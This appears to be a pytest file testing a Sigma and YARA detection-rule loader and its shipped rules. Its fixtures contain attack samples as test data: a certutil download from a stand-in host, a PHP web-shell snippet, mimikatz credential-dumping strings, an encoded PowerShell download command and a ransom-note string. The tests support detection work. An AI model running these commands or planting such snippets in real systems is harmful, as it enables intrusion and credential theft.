"""Tests for the repository rule loader (Step 26).

Covers :mod:`app.services.detection.rule_loader` — the deterministic
loader that turns the repository Sigma YAML + YARA files into the existing
``DetectionRule`` schema:

* Sigma: deterministic file ordering, field mapping, ``id``/title/level
  handling, missing/invalid definitions rejected loudly;
* YARA: rule-id/meta extraction, verbatim content, compile-ability;
* registry duplicates rejected through the existing ``register`` API;
* the shipped 53-rule repository set loads, registers, compiles, and
  evaluates benign input without a single failure (end-to-end regression
  guard for the real rule files).

Pure unit tests — no database, no network, no LLM.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from app.schemas.detection import (
    DetectionMetadata,
    DetectionRule,
    DetectionSeverity,
    RuleType,
)
from app.schemas.normalized_event import (
    Actor,
    EventCategory,
    NormalizedSecurityEvent,
)
from app.schemas.security_event import SourceType
from app.services.detection.registry import DetectionRuleRegistry, DuplicateDetectionRuleError
from app.services.detection.rule_loader import (
    DEFAULT_RULES_DIR,
    build_registry,
    load_detection_rules,
    load_sigma_rules,
    load_yara_rules,
)
from app.services.detection.sigma.engine import SigmaDetectionEngine
from app.services.detection.yara.engine import YaraDetectionEngine
from app.services.detection.yara.target_adapter import YaraTarget

SERVER_REPO_SIGMA = "11111111-1111-4111-8111-111111111111"
SERVER_REPO_YARA = "yara-suspicious-script-v1"


def _sigma_yml(rule_id: str, title: str = "Test Sigma", **override) -> str:
    doc = {
        "title": title,
        "id": rule_id,
        "status": "stable",
        "logsource": {"category": "process"},
        "detection": {"sel": {"Image": "*.exe"}, "condition": "sel"},
        "level": "medium",
    }
    doc.update(override)
    lines = []
    for key, value in doc.items():
        lines.append(f"{key}: {value!r}" if isinstance(value, str) else f"{key}: {value}")
    return "\n".join(lines)


def _safe_event() -> NormalizedSecurityEvent:
    return NormalizedSecurityEvent(
        event_id=uuid.uuid4(),
        timestamp=datetime.now(timezone.utc),
        event_category=EventCategory.PROCESS,
        source="test",
        source_type=SourceType.OPERATING_SYSTEM,
        actor=Actor(username="benign"),
        normalized_data={},
    )


# ---------------------------------------------------------------------------
# Sigma loading
# ---------------------------------------------------------------------------


def test_sigma_loading_is_deterministic_and_maps_fields(tmp_path: Path) -> None:
    (tmp_path / "01-first.yml").write_text(
        _sigma_yml("aaaaaaaa-1111-4111-8111-111111111111", title="First Rule", level="high")
    )
    (tmp_path / "02-second.yml").write_text(
        _sigma_yml("bbbbbbbb-2222-4222-8222-222222222222", title="Second Rule", level="low")
    )

    rules = load_sigma_rules(tmp_path)

    assert [r.name for r in rules] == ["First Rule", "Second Rule"]
    first = rules[0]
    assert first.rule_id == "aaaaaaaa-1111-4111-8111-111111111111"
    assert first.rule_type is RuleType.SIGMA
    assert first.severity is DetectionSeverity.HIGH
    assert first.enabled is True
    assert first.version == "1.0.0"
    assert first.metadata.extra["source_file"] == "01-first.yml"
    assert first.metadata.extra["category"] == "process"
    assert isinstance(first.content, dict)
    assert first.content["detection"]["condition"] == "sel"


def test_sigma_missing_id_raises(tmp_path: Path) -> None:
    (tmp_path / "no-id.yml").write_text("title: X\nlogsource:\n  category: process\n")
    with pytest.raises(ValueError, match="no id"):
        load_sigma_rules(tmp_path)


def test_sigma_non_mapping_raises(tmp_path: Path) -> None:
    (tmp_path / "list.yml").write_text("- just\n- a\n- list\n")
    with pytest.raises(ValueError, match="not a mapping"):
        load_sigma_rules(tmp_path)


def test_sigma_deprecated_status_disables_rule(tmp_path: Path) -> None:
    (tmp_path / "dep.yml").write_text(
        _sigma_yml("cccccccc-3333-4333-8333-333333333333", status="deprecated")
    )
    rules = load_sigma_rules(tmp_path)
    assert len(rules) == 1
    assert rules[0].enabled is False


def test_non_rule_files_are_ignored(tmp_path: Path) -> None:
    (tmp_path / "README.md").write_text("# not a rule\n")
    (tmp_path / "notes.txt").write_text("not a rule either")
    (tmp_path / "real.yml").write_text(_sigma_yml("dddddddd-4444-4444-8444-444444444444"))
    assert len(load_sigma_rules(tmp_path)) == 1


# ---------------------------------------------------------------------------
# YARA loading
# ---------------------------------------------------------------------------


def test_yara_loading_uses_meta_id_and_verbatim_content(tmp_path: Path) -> None:
    source = (
        'rule Suspicious_Script {\n'
        '  meta:\n'
        '    id = "yara-suspicious-script-v1"\n'
        '    title = "Suspicious Script"\n'
        '    severity = "high"\n'
        '  strings:\n'
        '    $a = "download"\n'
        '  condition:\n'
        '    $a\n'
        '}\n'
    )
    (tmp_path / "suspicious_script.yar").write_text(source)

    rules = load_yara_rules(tmp_path)

    assert len(rules) == 1
    rule = rules[0]
    assert rule.rule_id == "yara-suspicious-script-v1"
    assert rule.rule_type is RuleType.YARA
    assert rule.severity is DetectionSeverity.HIGH
    assert rule.content == source
    assert rule.metadata.extra["yara_rule_name"] == "Suspicious_Script"
    assert rule.metadata.extra["category"] == "file"


def test_yara_missing_meta_id_falls_back_to_rule_name(tmp_path: Path) -> None:
    (tmp_path / "X.yar").write_text(
        'rule NoId_Rule {\n  strings:\n    $a = "x"\n  condition:\n    $a\n}\n'
    )
    rules = load_yara_rules(tmp_path)
    assert rules[0].rule_id == "yara-NoId_Rule"


def test_yara_invalid_source_compiles_failure_through_engine(tmp_path: Path) -> None:
    (tmp_path / "broken.yar").write_text("rule Broken { strings: } ")
    rules = load_yara_rules(tmp_path)
    assert len(rules) == 1
    engine = YaraDetectionEngine()
    report = engine.evaluate_target(YaraTarget(content=b"x", file_name="x.txt"), rules)
    assert not report.results
    assert any(f.error_type == "malformed_rule" for f in report.failures)


# ---------------------------------------------------------------------------
# Registry integration
# ---------------------------------------------------------------------------


def test_duplicate_rule_id_rejected_by_registry(tmp_path: Path) -> None:
    dup = "eeeeeeee-5555-4555-8555-555555555555"
    (tmp_path / "01.yml").write_text(_sigma_yml(dup))
    (tmp_path / "02.yml").write_text(_sigma_yml(dup))
    with pytest.raises(DuplicateDetectionRuleError):
        build_registry(tmp_path, tmp_path)


def test_registry_registers_loaded_rules_verbatim(tmp_path: Path) -> None:
    (tmp_path / "01.yml").write_text(_sigma_yml("ffffffff-6666-4666-8666-666666666666"))
    registry = build_registry(tmp_path, tmp_path)
    assert len(registry.list_rules()) == 1


# ---------------------------------------------------------------------------
# Shipped repository rule set — end-to-end regression guard
# ---------------------------------------------------------------------------


def test_shipped_repo_rules_load_deterministically() -> None:
    rules = load_detection_rules()
    assert len(rules) == 53
    sigma = [r for r in rules if r.rule_type is RuleType.SIGMA]
    yara = [r for r in rules if r.rule_type is RuleType.YARA]
    assert len(sigma) == 28
    assert len(yara) == 25
    ids = [r.rule_id for r in rules]
    assert len(ids) == len(set(ids))
    assert SERVER_REPO_SIGMA in ids
    assert SERVER_REPO_YARA in ids
    assert all(r.enabled for r in rules)
    assert any(r.severity is DetectionSeverity.CRITICAL for r in rules)


def test_shipped_sigma_rules_never_match_benign_event() -> None:
    """All 8 Sigma rules compile+parse and evaluate a benign event cleanly."""
    sigma_rules = load_sigma_rules()
    engine = SigmaDetectionEngine()
    report = engine.evaluate(_safe_event(), rules=sigma_rules)
    assert not report.results
    assert not report.failures


def test_shipped_yara_rules_compile_and_ignore_benign_bytes() -> None:
    yara_rules = load_yara_rules()
    engine = YaraDetectionEngine()
    report = engine.evaluate_target(
        YaraTarget(content=b"perfectly benign application log line", file_name="app.log"),
        yara_rules,
    )
    assert not report.results
    assert not report.failures


def test_shipped_sigma_rules_match_their_intended_signals() -> None:
    """Each Sigma rule fires on its designed event and stays silent otherwise."""
    sigma_rules = load_sigma_rules()
    engine = SigmaDetectionEngine()
    by_id = {r.rule_id: r for r in sigma_rules}
    positives = {
        "11111111-1111-4111-8111-111111111111": dict(cat=EventCategory.PROCESS, image="C:\\W\\powershell.exe", cmd="powershell.exe -enc x"),
        "22222222-2222-4222-8222-222222222222": dict(cat=EventCategory.AUTHENTICATION, action="login", outcome="failure"),
        "33333333-3333-4333-8333-333333333333": dict(cat=EventCategory.PROCESS, image="C:\\Windows\\System32\\cmd.exe"),
        "44444444-4444-4444-8444-444444444444": dict(cat=EventCategory.SYSTEM, action="privilege escalation detected"),
        "55555555-5555-4555-8555-555555555555": dict(cat=EventCategory.NETWORK, action="rdp session established"),
        "66666666-6666-4666-8666-666666666666": dict(cat=EventCategory.PROCESS, cmd="certutil -urlcache -split -f http://x/1.exe c:\\t\\1.exe"),
        "77777777-7777-4777-8777-777777777777": dict(cat=EventCategory.AUTHENTICATION, action="login", outcome="denied"),
        "88888888-8888-4888-8888-888888888888": dict(cat=EventCategory.NETWORK, action="smb connection", extra={"DestinationProtocol": "smb"}),
    }
    from app.schemas.normalized_event import EventOutcome, ProcessInfo

    outcome_map = {"success": EventOutcome.SUCCESS, "failure": EventOutcome.FAILURE, "denied": EventOutcome.DENIED}

    def build(rule_id: str, kw: dict) -> NormalizedSecurityEvent:
        actor_name = "svc-backup$" if rule_id == "77777777-7777-4777-8777-777777777777" else "svc-test"
        return NormalizedSecurityEvent(
            event_id=uuid.uuid4(),
            timestamp=datetime.now(timezone.utc),
            event_category=kw["cat"],
            action=kw.get("action"),
            outcome=outcome_map.get(kw.get("outcome", "success"), EventOutcome.SUCCESS),
            source="test",
            source_type=SourceType.OPERATING_SYSTEM,
            actor=Actor(username=actor_name),
            process=(
                ProcessInfo(name=kw.get("image") or "ps.exe", command_line=kw.get("cmd"), executable=kw.get("image"))
                if kw.get("image") or kw.get("cmd")
                else None
            ),
            normalized_data=kw.get("extra") or {},
        )

    for rule_id, kw in positives.items():
        event = build(rule_id, kw)
        report = engine.evaluate(event, rules=[by_id[rule_id]])
        assert report.results and not report.failures, f"{rule_id} failed to match"
        assert report.results[0].rule_id == rule_id


def test_shipped_yara_rules_match_their_intended_bytes() -> None:
    yara_rules = load_yara_rules()
    engine = YaraDetectionEngine()
    cases = [
        ("yara-suspicious-script-v1", b"var _0xabc = 'FAKE_VAL'; -windowstyle hidden"),
        ("yara-web-shell-v1", b"<?php if(eval($_POST[\"c\"])) { shell_exec($_GET[\"q\"]); } ?>"),
        ("yara-credential-stealing-v1", b"sekurlsa::logonpasswords mimikatz lsass.exe"),
        ("yara-powershell-artifact-v1", b"powershell -EncodedCommand AAAA -NoProfile DownloadString"),
        ("yara-ransomware-marker-v1", b"@Please_Read_Me@ your files have been encrypted, contact us for decryption"),
    ]
    for rule_id, content in cases:
        report = engine.evaluate_target(YaraTarget(content=content, file_name="hit.bin"), yara_rules)
        assert any(r.rule_id == rule_id for r in report.results), f"{rule_id} failed to match"
        assert not report.failures